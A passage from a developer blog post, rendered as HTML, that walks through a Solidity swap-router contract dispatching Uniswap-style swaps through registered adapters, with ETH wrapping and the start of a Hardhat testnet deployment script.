punctuation\">]</span> path<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> percent<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> amountOut<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> deadline<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">MultiSwapParams</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> srcToken<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> destToken<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> amountIn<span class=\"token punctuation\">;</span>\n    SwapStep<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> swaps<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">SingleSwap</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint</span> adapterId<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> routerId<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> amountIn<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> amountOut<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> deadline<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> path<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// ...</span></code></pre></div>\n<ul>\n<li>We designed the contract for adapter management earlier, but based on the increased adapterID value, we manage each adapter mapping data in the storage.</li>\n<li>During Uniswap Swapping, it is important to manage data by user on storage, and in the case of <code class=\"language-text\">SwapStep</code> structure, index information of data managed by mapping, address values of multi-tokens, balance of liquidity pool, amount of money, and swapping are important. Used to store instantaneous time in case of failure.</li>\n<li><code class=\"language-text\">MultiSwapParams</code> and <code class=\"language-text\">SingleSwap</code> are used when implementing the <code class=\"language-text\">SwapExactInputSingle</code> function of each Swap Contract used in the Uniswap protocol, respectively.</li>\n</ul>\n<h3 id=\"functions\" style=\"position:relative;\"><a href=\"#functions\" aria-label=\"functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">simpleSwapExactInputSingle</span><span class=\"token punctuation\">(</span>\n    <span class=\"token builtin\">uint256</span> adapterId<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> routerId<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> amountIn<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> amountOut<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">address</span> srcToken<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">address</span> destToken<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> deadline\n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>adapters<span class=\"token punctuation\">[</span>adapterId<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Adapter not registered\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    IAdapter adapter <span class=\"token operator\">=</span> <span class=\"token function\">IAdapter</span><span class=\"token punctuation\">(</span>adapters<span class=\"token punctuation\">[</span>adapterId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">(</span>srcToken<span class=\"token punctuation\">,</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">_wrapETH</span><span class=\"token punctuation\">(</span>amountIn<span class=\"token punctuation\">,</span> srcToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span><span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>Utils<span class=\"token punctuation\">.</span>WETH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>adapter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amountIn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span>\n        adapter<span class=\"token punctuation\">.</span><span class=\"token function\">swapExactInputSingle</span><span class=\"token punctuation\">(</span>\n            routerId<span class=\"token punctuation\">,</span>\n            amountIn<span class=\"token punctuation\">,</span>\n            amountOut<span class=\"token punctuation\">,</span>\n            srcToken<span class=\"token punctuation\">,</span>\n            destToken<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n            to<span class=\"token punctuation\">,</span>\n            deadline\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>✅ The value of the adapters mapping data must be a valid address, that is, an authenticated address.</p>\n<ul>\n<li>If it belongs to the certified adapter contract storage, the lower router is registered.</li>\n<li>Wrapping before swapping (wrapperETH contract) Using <code class=\"language-text\">_wrapETH</code> function</li>\n<li>Approval process to deliver WETH based on the information of the contract to be swapped in. At this time, the value of <code class=\"language-text\">from</code> should be the address of the current contract instance.</li>\n<li>Perform a single swap function through the <code class=\"language-text\">swapExactInputSingle</code> Uniswap function after real user authentication and approval are completed</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">multiSwapExactInput</span><span class=\"token punctuation\">(</span>MultiSwapParams <span class=\"token keyword\">memory</span> params<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">external</span>\n    <span class=\"token keyword\">payable</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> to <span class=\"token operator\">=</span> params<span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">.</span>srcToken<span class=\"token punctuation\">,</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">_wrapETH</span><span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">.</span>amountIn<span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">.</span>srcToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">.</span>destToken <span class=\"token operator\">==</span> Utils<span class=\"token punctuation\">.</span>ETH<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        to <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token builtin\">uint256</span> totalAmountsOut <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> params<span class=\"token punctuation\">.</span>swaps<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        SwapStep <span class=\"token keyword\">memory</span> swapParams <span class=\"token operator\">=</span> params<span class=\"token punctuation\">.</span>swaps<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            adapters<span class=\"token punctuation\">[</span>swapParams<span class=\"token punctuation\">.</span>adapterId<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Adapter not registered\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">address</span> destSwapToken <span class=\"token operator\">=</span> swapParams<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">[</span>swapParams<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            destSwapToken <span class=\"token operator\">==</span> params<span class=\"token punctuation\">.</span>destToken <span class=\"token operator\">||</span>\n                <span class=\"token punctuation\">(</span>destSwapToken <span class=\"token operator\">==</span> Utils<span class=\"token punctuation\">.</span>WETH <span class=\"token operator\">&amp;&amp;</span>\n                    params<span class=\"token punctuation\">.</span>destToken <span class=\"token operator\">==</span> Utils<span class=\"token punctuation\">.</span>ETH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"destToken doesn't match\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> amountIn <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">.</span>amountIn <span class=\"token operator\">*</span> swapParams<span class=\"token punctuation\">.</span>percent<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">;</span>\n        IAdapter adapter <span class=\"token operator\">=</span> <span class=\"token function\">IAdapter</span><span class=\"token punctuation\">(</span>adapters<span class=\"token punctuation\">[</span>swapParams<span class=\"token punctuation\">.</span>adapterId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> amounts <span class=\"token operator\">=</span> adapter<span class=\"token punctuation\">.</span><span class=\"token function\">swapExactInput</span><span class=\"token punctuation\">(</span>\n            swapParams<span class=\"token punctuation\">.</span>routerId<span class=\"token punctuation\">,</span>\n            amountIn<span class=\"token punctuation\">,</span>\n            swapParams<span class=\"token punctuation\">.</span>amountOut<span class=\"token punctuation\">,</span>\n            swapParams<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n            to<span class=\"token punctuation\">,</span>\n            swapParams<span class=\"token punctuation\">.</span>deadline\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        totalAmountsOut <span class=\"token operator\">+=</span> amounts<span class=\"token punctuation\">[</span>amounts<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Swap</span><span class=\"token punctuation\">(</span>\n            msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span>\n            params<span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">,</span>\n            params<span class=\"token punctuation\">.</span>srcToken<span class=\"token punctuation\">,</span>\n            params<span class=\"token punctuation\">.</span>destToken<span class=\"token punctuation\">,</span>\n            swapParams<span class=\"token punctuation\">.</span>amountOut<span class=\"token punctuation\">,</span>\n            amounts<span class=\"token punctuation\">[</span>amounts<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            swapParams<span class=\"token punctuation\">.</span>percent\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">.</span>destToken <span class=\"token operator\">==</span> Utils<span class=\"token punctuation\">.</span>ETH<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">IWETH</span><span class=\"token punctuation\">(</span>Utils<span class=\"token punctuation\">.</span>WETH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span>totalAmountsOut<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>totalAmountsOut<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>It was configured in a form that supports multi-tokens with the same function as the single above. After composing the data corresponding to the multi-token pair with <code class=\"language-text\">SwapStep</code>, the value is stored in the form of an array, and then the previous logic is executed as much as the length of the array to sequentially perform swapping.</li>\n<li>Since it is necessary to un-wrapping WETH and exchange it for ETH, when swapping with ether, the address is changed to the address of this contract and then delivered to the user</li>\n</ul>\n<p>✅ The second require condition is to check if the target token is swap and match the last token, then check if the target token is ETH, and the last token in the address of the multi-token array must be WETH.</p>\n<ul>\n<li>equally</li>\n</ul>\n<h3 id=\"util-functions\" style=\"position:relative;\"><a href=\"#util-functions\" aria-label=\"util functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Util Functions</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">_wrapETH</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amountToWrap<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> tokenInput<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">internal</span>\n    <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenOutput<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tokenInput <span class=\"token operator\">==</span> Utils<span class=\"token punctuation\">.</span>ETH<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERR-04\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> amountToWrap<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERR-05\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">IWETH</span><span class=\"token punctuation\">(</span>Utils<span class=\"token punctuation\">.</span>WETH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        tokenOutput <span class=\"token operator\">=</span> Utils<span class=\"token punctuation\">.</span>WETH<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">from</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        tokenOutput <span class=\"token operator\">=</span> tokenInput<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">from</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>Provides a utility function that wraps ETH into WETH. Given a token, the function returns the WETH address as the token output if the token input is ETH. <code class=\"language-text\">tokenInput</code> token input address, <code class=\"language-text\">amountToWrap</code> used as the amount of token input to wrap. If the token input is not WETH, the return value tokenOutput is the same, and if the token input is not WETH, the from address is msg.sender.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">registerAdapter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _adapterIdx<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _routerAddress<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">external</span>\n    onlyOwner\n<span class=\"token punctuation\">{</span>\n    adapters<span class=\"token punctuation\">[</span>_adapterIdx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _routerAddress<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>\n<p>It is designed to update and modify mapping data for contract adapters management.</p>\n</li>\n<li>\n<p>Finally, Share-Value</p>\n</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">computeLiquidityShareValue</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> liquidity<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> tokenA<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> tokenB<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> tokenAAmount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> tokenBAmount<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">revert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"TODO\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span></code></pre></div>\n<h2 id=\"contract-testing---deploy-testnet\" style=\"position:relative;\"><a href=\"#contract-testing---deploy-testnet\" aria-label=\"contract testing   deploy testnet permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Contract Testing  &#x26;&#x26; Deploy Testnet</h2>\n<ul>\n<li>As Uniswap Swapping Contract design and development have been completed previously, simple testing and distribution will be conducted on the Rinkeby testnet.</li>\n<li>The data required for testing will be parsed by referring to the DAI, USDC, and USDT ERC20 token contracts that exist on the mainnet.</li>\n<li>For some tests, we use the functional Rouunter contract of SushiSwap and ShibaSwap contracts implemented by forking Uniswap, and the current contract that has been deployed for some tests.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>\n  ChainId<span class=\"token punctuation\">,</span>\n  Fetcher<span class=\"token punctuation\">,</span>\n  Percent<span class=\"token punctuation\">,</span>\n  Route<span class=\"token punctuation\">,</span>\n  Token<span class=\"token punctuation\">,</span>\n  TokenAmount<span class=\"token punctuation\">,</span>\n  Trade<span class=\"token punctuation\">,</span>\n  TradeType<span class=\"token punctuation\">,</span>\n  <span class=\"token constant\">WETH</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@uniswap/sdk\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> BigNumber <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"ethers\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> ethers<span class=\"token punctuation\">,</span> upgrades <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hardhat\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> dotenv <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dotenv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\ndotenv<span class=\"token punctuation\">.</span><span class=\"token function\">config</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> path<span class=\"token operator\">:</span> <span class=\"token string\">\"./.env.local\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> addresses <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token constant\">DAI</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0x6B175474E89094C44Da98b954EedeAC495271d0F\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token constant\">USDC</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token constant\">DEAD</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0x000 000000000000000000000000000000000dEaD\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token constant\">USDT</span><span class=\"token operator\">:</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">getAddress</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0xdac17f958d2ee523a2206206994597c13d831ec7\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n  <span class=\"token constant\">ETH</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token constant\">WETH</span><span class=\"token operator\">:</span> <span class=\"token constant\">WETH</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n  UniswapV2Router<span class=\"token operator\">:</span> <span class=\"token string\">\"0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\"</span><span class=\"token punctuation\">,</span>\n  SushiSwapRouter<span class=\"token operator\">:</span> <span class=\"token string\">\"0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F\"</span><span class=\"token punctuation\">,</span>\n  ShibaSwapRouter<span class=\"token operator\">:</span> <span class=\"token string\">\"0x03f7724180AA6b939894B5Ca4314783B0b36b329\"</span><span class=\"token punctuation\">,</span>\n  SwapperContract<span class=\"token operator\">:</span> <span class=\"token string\">\"0x522864625577b80fFaae1B94d703a1913350811d\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> DAIContract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractAt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"IERC20\"</span><span class=\"token punctuation\">,</span> addresses<span class=\"token punctuation\">.</span><span class=\"token constant\">DAI</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> USDCContract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractAt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"IERC20\"</span><span class=\"token punctuation\">,</span> addresses<span class=\"token punctuation\">.</span><span class=\"token constant\">USDC</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> WETHContractIWETH <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractAt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"IWETH\"</span><span class=\"token punctuation\">,</span> addresses<span class=\"token punctuation\">.</span><span class=\"token constant\">WETH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> WETHContractIERC20 <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractAt</span><span class=\"token punctuation\">(</span>\n    <span class=\"token string\">\"IERC20\"</span><span class=\"token punctuation\">,</span>\n    addresses<span class=\"token punctuation\">.</span><span class=\"token constant\">WETH</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> Utils <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Utils\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> utils <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> Utils<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">await</span> utils<span class=\"token punctuation\">.</span><span class=\"token function\">deployed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> Swapper <span class=\"token operator\">=</span> 